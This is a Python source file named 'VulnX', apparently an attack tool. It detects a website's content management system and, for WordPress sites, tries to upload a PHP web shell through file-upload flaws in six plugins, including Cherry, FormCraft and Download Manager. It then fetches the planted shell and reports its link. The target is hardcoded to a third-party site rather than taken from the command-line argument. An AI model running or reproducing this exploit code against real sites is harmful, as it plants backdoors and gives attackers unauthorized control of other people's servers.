#!/usr/bin/env python

# Title : VulnX
# Author: BENSAAD Anouar


import re
import sys
import os
import argparse
import requests
import urllib
import datetime

B = '\033[94m' #blue
R = '\033[91m' # red
W = '\033[0m'  # white
Y = '\033[93m' # yellow
G = '\033[92m' # green

# Author : BENSAAD ANOUAR

now = datetime.datetime.now()
year = now.strftime('%Y')
month= now.strftime('%m')

url = "https://www.maplatine.com"
def banner():
    print("""%s
                   __     __     _      __  __
                   \ \   / /   _| |_ __ \ \/ /
                    \ \ / / | | | | '_ \ \  / 
                     \ V /| |_| | | | | |/  \ 
                      \_/  \__,_|_|_| |_/_/\_\%s%s
                # Coded By Anouar Ben Saad - @anouarbensaad
    """ % (G, W, R))

def parser_error(errmsg):
    banner()
    print("Usage: python " + sys.argv[0] + " [Options] use -h for help")
    print(R + "Error: " + errmsg + W)
    sys.exit()


def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -u google.com")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-u', '--url', help="Url scanned for", required=True)
    parser.add_argument('-f', '--file', help='Insert your file to scanning for')
    parser.add_argument('-o', '--output', help='Save the results to text file')
    return parser.parse_args()

################ KNOWS #####################

def contentw():
    id = 0
    headers = {
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31",
            "Keep-Alive": "timeout=15"
        }

    r=requests.get(url, headers)
    content = r.text
    joomla = re.findall("com_content | Joomla!", content)
    wordpress = re.findall("wp-content|wordpress|xmlrpc.php", content)
    drupal = re.findall("Drupal|drupal|sites\/all|drupal.org", content)
    prestashop = re.findall("Prestashop|prestashop", content)
    if joomla:
        print ('%s[%i] %s %s Joomla \n\n' % (W,id,url,G))
    elif wordpress:
        print ('%s[%i] %s %s Wordpress \n %s' % (W,id,url,G,W))
        print ('%s [~] Scanning for Wordpress Exploits %s' %(Y,W))
        #WP_EXPLOITS CALLFUNCTIONS
        wp_blaze()
        wp_catpro()
        wp_cherry()
        wp_dm()
        wp_fromcraft()
        wp_jobmanager()
    elif drupal:
        print ('%s[%i] %s %s Drupal \n\n' % (W,id,url,G))
    elif prestashop:
        print ('%s[%i] %s %s Prestashop \n\n' % (W,id,url,G))
    else:
        print ('%s[%i] %s %s Unknown \n\n' % (W,id,url,G))

################ Blaze Plugin #####################

def wp_blaze():
    options = {
                'Content_Type':'multipart/form-data',
               'album_img':[open('VulnX.php','rb')],
               'task':'blaze_add_new_album',
               'album_name':'',
               'album_desc':''
        }
    endpoint = url + "/wp-admin/admin.php?page=blaze_manage"
    send_shell = requests.post(endpoint,options)
    content  = send_shell.text
    check_blaze = re.findall("\/uploads\/blaze\/(.*?)\/big\/VulnX.php", content)
    if check_blaze:
        print ('%s [%s+%s] Blaze Plugin%s -------------- %s YES' %(W,G,W,W,G))
    else:
        print ('%s [%s-%s] Blaze Plugin%s -------------- %s NO' %(W,R,W,W,R))    


################ Catpro Plugin #####################

def wp_catpro():
    options = {
            'Content_Type':'multipart/form-data',
            'album_img':[open('VulnX.php','rb')],
            'task':'cpr_add_new_album',
            'album_name':'',
            'album_desc':''
    }
    endpoint = url + "/wp-admin/admin.php?page=catpro_manage"
    send_shell = requests.post(endpoint,options)
    content  = send_shell.text
    check_catpro = re.findall("\/uploads\/blaze\/(.*?)\/big\/VulnX.php", content)
    if check_catpro:
        print ('%s [%s+%s] Catpro Plugin%s ------------- %s YES' %(W,G,W,W,G))
    else:
        print ('%s [%s-%s] Catpro Plugin%s ------------- %s NO' %(W,R,W,W,R))    

################ Cherry Plugin #####################

def  wp_cherry():
    options = {
            'Content_Type':'multipart/form-data',
            'file':open('VulnX.php','rb')
    }
    endpoint = url + "/wp-content/plugins/cherry-plugin/admin/import-export/upload.php"
    send_shell = requests.post(endpoint,options)
    response  = send_shell.text
    dump_data  = url + "/wp-content/plugins/cherry-plugin/admin/import-export/VulnX.php?Vuln=X"
    response=requests.get(dump_data, options)
    content  = response.text
    check_cherry = re.findall("Vuln X", content)
    if check_cherry:
        print ('%s [%s+%s] Cherry Plugin%s ------------- %s YES' %(W,G,W,W,G))
        print ('%s [*]Shell Uploaded Successfully \n %s link : %s ' % ( B,W, dump_data ))
    else:
        print ('%s [%s-%s] Cherry Plugin%s ------------- %s NO' %(W,R,W,W,R))    

################ Download Manager Plugin #####################
def wp_dm():
    options = {
            'Content_Type':'multipart/form-data',
            'upfile':open('VulnX.php','rb'),
            'dm_upload':''
    }
    send_shell = requests.post(url,options)
    dump_data = url + "/wp-content/plugins/downloads-manager/upload/VulnX.php?Vuln=X"
    response=requests.get(dump_data, options)
    content  = response.text
    check_dm = re.findall("Vuln X", content)
    if check_dm:
        print ('%s [%s+%s] Download Manager Plugin%s---- %s YES' %(W,G,W,W,G))
        print ('%s [*]Shell Uploaded Successfully \n %s link : %s ' % ( B,W, dump_data ))
    else:
        print ('%s [%s-%s] Download Manager Plugin%s --- %s NO' %(W,R,W,W,R))    

################ Fromcraft Plugin #####################
def wp_fromcraft():
    shell = open('VulnX.php','rb')
    fields= "files[]"
    options = {
            'Content_Type':'multipart/form-data',
            fields:shell
    }
    endpoint = url + "/wp-content/plugins/formcraft/file-upload/server/php/"
    send_shell = requests.post(endpoint,options)
    response  = send_shell.text
    dump_data  = url + "/wp-content/plugins/formcraft/file-upload/server/php/files/VulnX.php?Vuln=X"
    check_fromcraft = re.findall("\"files", response)
    if check_fromcraft:
        print ('%s [%s+%s] Fromcraft Plugin%s ---------- %s YES' %(W,G,W,W,G))
        print ('%s [*]Shell Uploaded Successfully \n %s link : %s ' % ( B,W, dump_data ))
    else:
        print ('%s [%s-%s] Fromcraft Plugin%s ---------- %s NO' %(W,R,W,W,R))    

################ Job Manager Plugin #####################

def wp_jobmanager():
    endpoint = url + "/jm-ajax/upload_file/"
    image = open('vulnx.gif','rb')
    field = "file[]"
    options = {
            'Content_Type':'form-data',
            field:image
    }
    send_image = requests.post(endpoint,options)
    dump_data = url + "/wp-content/uploads/job-manager-uploads/file/"+year+"/"+month+"/vulnx.gif"
    response=requests.get(dump_data, options)
    res  = response.headers['content-type']
    check_jobmanager = re.findall("image\/gif", res)
    if check_jobmanager:
        print ('%s [%s+%s] Job Manager Plugin%s -------- %s YES' %(W,G,W,W,G))
        print ('%s [*]Shell Uploaded Successfully \n %s link : %s ' % ( B,W, dump_data ))
    else:
        print ('%s [%s-%s] Job Manager Plugin%s ------- %s NO' %(W,R,W,W,R))    




if __name__ == "__main__":

    #site = args.file
    banner()
    contentw()
